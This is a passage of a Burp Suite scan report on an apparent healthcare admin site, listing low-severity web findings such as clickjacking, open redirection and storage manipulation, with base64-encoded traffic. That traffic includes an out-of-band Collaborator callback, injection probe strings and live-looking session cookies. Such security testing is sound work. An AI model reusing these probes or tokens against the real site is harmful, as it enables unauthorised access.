      <time>2024-Dec-15 00:41:13.642 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG1xZzF3bmgyY2pqeDRoZHU5MTV1dXR1d2xucmhmODMxMnBzY2kwNy5vYXN0aWZ5LmNvbQ0KdXNlci1hZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTUuMC4yODgzLjg3IFNhZmFyaS81MzcuMzYNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYyDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1namdscmdpZmlnejwvYm9keT48L2h0bWw+]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>6214732652632498176</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li><li><a href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</a></li><li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9FbWFpbCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9NW5nZTI2ZHBqNTM4YmwxdmlydTZhYnZwdWc7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPURJeXZhaHVvZkp4TXhTRGl4ZTUyanJwYXVPUTR4WEVlWHZOUEpHNitTUkJHYXllZGtsQjdjVDZhQUM0Ty9oVllRV21CMS9HdTZMaDg2MFlGUW50bXNWVFdKVVlrMmN0VDFJNU9xaTBJSFJuQXkwdjJ1NUtBbWxSaW5JaFk7IEFXU0FMQkNPUlM9REl5dmFodW9mSnhNeFNEaXhlNTJqcnBhdU9RNHhYRWVYdk5QSkc2K1NSQkdheWVka2xCN2NUNmFBQzRPL2hWWVFXbUIxL0d1NkxoODYwWUZRbnRtc1ZUV0pVWWsyY3RUMUk1T3FpMElIUm5BeTB2MnU1S0FtbFJpbkloWQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7286252516635170816</serialNumber>
    <type>5244160</type>
    <name><![CDATA[Cross-domain script include]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.</p>
<p>If you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Scripts should ideally not be included from untrusted domains. Applications that rely on static third-party scripts should consider using Subresource Integrity to make browsers verify them, or copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The response dynamically includes the following scripts from other domains:<ul><li>https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js</li><li>https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js]]></issueDetailItem>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9FbWFpbCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9NW5nZTI2ZHBqNTM4YmwxdmlydTZhYnZwdWc7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPURJeXZhaHVvZkp4TXhTRGl4ZTUyanJwYXVPUTR4WEVlWHZOUEpHNitTUkJHYXllZGtsQjdjVDZhQUM0Ty9oVllRV21CMS9HdTZMaDg2MFlGUW50bXNWVFdKVVlrMmN0VDFJNU9xaTBJSFJuQXkwdjJ1NUtBbWxSaW5JaFk7IEFXU0FMQkNPUlM9REl5dmFodW9mSnhNeFNEaXhlNTJqcnBhdU9RNHhYRWVYdk5QSkc2K1NSQkdheWVka2xCN2NUNmFBQzRPL2hWWVFXbUIxL0d1NkxoODYwWUZRbnRtc1ZUV0pVWWsyY3RUMUk1T3FpMElIUm5BeTB2MnU1S0FtbFJpbkloWQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8268952109672014848</serialNumber>
    <type>5243152</type>
    <name><![CDATA[Open redirection (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/open-redirection">Web Security Academy: Open redirection (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based open redirection. Data is read from <b>input.value</b> and passed to <b>xhr.open</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9FbWFpbCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9NW5nZTI2ZHBqNTM4YmwxdmlydTZhYnZwdWc7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPURJeXZhaHVvZkp4TXhTRGl4ZTUyanJwYXVPUTR4WEVlWHZOUEpHNitTUkJHYXllZGtsQjdjVDZhQUM0Ty9oVllRV21CMS9HdTZMaDg2MFlGUW50bXNWVFdKVVlrMmN0VDFJNU9xaTBJSFJuQXkwdjJ1NUtBbWxSaW5JaFk7IEFXU0FMQkNPUlM9REl5dmFodW9mSnhNeFNEaXhlNTJqcnBhdU9RNHhYRWVYdk5QSkc2K1NSQkdheWVka2xCN2NUNmFBQzRPL2hWWVFXbUIxL0d1NkxoODYwWUZRbnRtc1ZUV0pVWWsyY3RUMUk1T3FpMElIUm5BeTB2MnU1S0FtbFJpbkloWQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>input.value</source>
      <sink>xhr.open</sink>
      <sourceStackTrace>at Object.BQODu (&lt;anonymous&gt;:1:95774)
at Object.USBMk (&lt;anonymous&gt;:1:394438)
at HTMLInputElement.get (&lt;anonymous&gt;:1:398284)
at HTMLInputElement.get [as value] (&lt;anonymous&gt;:1:514193)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/Email:41:163)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at _0xdc6a5f.&lt;computed&gt;._0x13cc4d.oknbI._0x3e2633.XMLHttpRequest.&lt;computed&gt; [as open] (&lt;anonymous&gt;:1:458938)
at Object.send (https://admin.miradorhealth.com/js/jquery.min.js:4:26275)
at Function.ajax (https://admin.miradorhealth.com/js/jquery.min.js:4:22180)
at advSearch (https://admin.miradorhealth.com/js/scripts.js?v=f72d42:11:11)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/Email:41:148)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue></sourceValue>
      <sinkValue>https://admin.miradorhealth.com/Search/vbjrkks35j%2527%2522`&apos;&quot;/vbjrkks35j/&gt;&lt;vbjrkks35j/\&gt;briyhkyokq&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>keyup</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;input class=&quot;form-control&quot; type=&quot;search&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot; onkeyup=&quot;advSearc</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>533795557758450688</serialNumber>
    <type>5246720</type>
    <name><![CDATA[HTML5 storage manipulation (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>
<p>HTML5 storage manipulation arises when a script stores controllable data in the HTML5 storage of the web browser (either localStorage or sessionStorage). An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will cause the user's browser to store attacker-controllable data.</p>
<p>This behavior does not in itself constitute a security vulnerability. However, if the application later reads the data back from storage and processes it in an unsafe way, then an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as cross-site scripting and JavaScript injection.
</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based HTML5 storage manipulation is not to place in HTML5 storage any data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from being stored.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/html5-storage-manipulation">Web Security Academy: HTML5 storage manipulation (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://capec.mitre.org/data/definitions/153.html">CAPEC-153: Input Data Manipulation</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based HTML5 storage manipulation. Data is read from <b>location.pathname</b> and passed to <b>localStorage.setItem.name</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9FbWFpbCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9NW5nZTI2ZHBqNTM4YmwxdmlydTZhYnZwdWc7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPURJeXZhaHVvZkp4TXhTRGl4ZTUyanJwYXVPUTR4WEVlWHZOUEpHNitTUkJHYXllZGtsQjdjVDZhQUM0Ty9oVllRV21CMS9HdTZMaDg2MFlGUW50bXNWVFdKVVlrMmN0VDFJNU9xaTBJSFJuQXkwdjJ1NUtBbWxSaW5JaFk7IEFXU0FMQkNPUlM9REl5dmFodW9mSnhNeFNEaXhlNTJqcnBhdU9RNHhYRWVYdk5QSkc2K1NSQkdheWVka2xCN2NUNmFBQzRPL2hWWVFXbUIxL0d1NkxoODYwWUZRbnRtc1ZUV0pVWWsyY3RUMUk1T3FpMElIUm5BeTB2MnU1S0FtbFJpbkloWQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo0NzozMyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXQtQ29va2llOiBBV1NBTEI9ZTd5YW01Q0NZUVpDR2pFOC95eldSTWhzTWd1S2Exd20wUCtkaE1GUE5XY1paM3NYNDVPNjZCSHVmYS9tcHVYOWN5UUpwOXNtQXZDalhkclduRS9kNnB3Rng5NnlISVV2S0R2V2ZmQXNGS1kwVk8zOWZPSHdiUVJGOU5OYjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjQ3OjMyIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWU3eWFtNUNDWVFaQ0dqRTgveXpXUk1oc01ndUthMXdtMFArZGhNRlBOV2NaWjNzWDQ1TzY2Qkh1ZmEvbXB1WDljeVFKcDlzbUF2Q2pYZHJXbkUvZDZwd0Z4OTZ5SElVdktEdldmZkFzRktZMFZPMzlmT0h3YlFSRjlOTmI7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo0NzozMiBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjwhLS1IZWFkZXIgQkVHSU4tLT4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgogICAgICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT5NaXJhZG9yIEluc2lnaHRzPC90aXRsZT4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ik1pcmFkb3IgSGVhbHRoIj4KICAgICAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWF4aW11bS1zY2FsZT0xLjAsIHVzZXItc2NhbGFibGU9bm8iIC8+CiAgICAgICAgPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS9pY28iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vaW1hZ2VzL2Zhdmljb24uaWNvIi8+CgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3Mvc2VsZWN0Mi5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2RhdGVyYW5nZXBpY2tlci5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZm9udGF3ZXNvbWUtZnJlZS1hbGwubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9kYXRhVGFibGVzLmJvb3RzdHJhcDQuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL3Jlc3BvbnNpdmUuYm9vdHN0cmFwNC5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYnV0dG9ucy5ib290c3RyYXA0LmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9hZG1pbmx0ZS5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2Jvb3RzdHJhcC1kYXRlcGlja2VyLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWl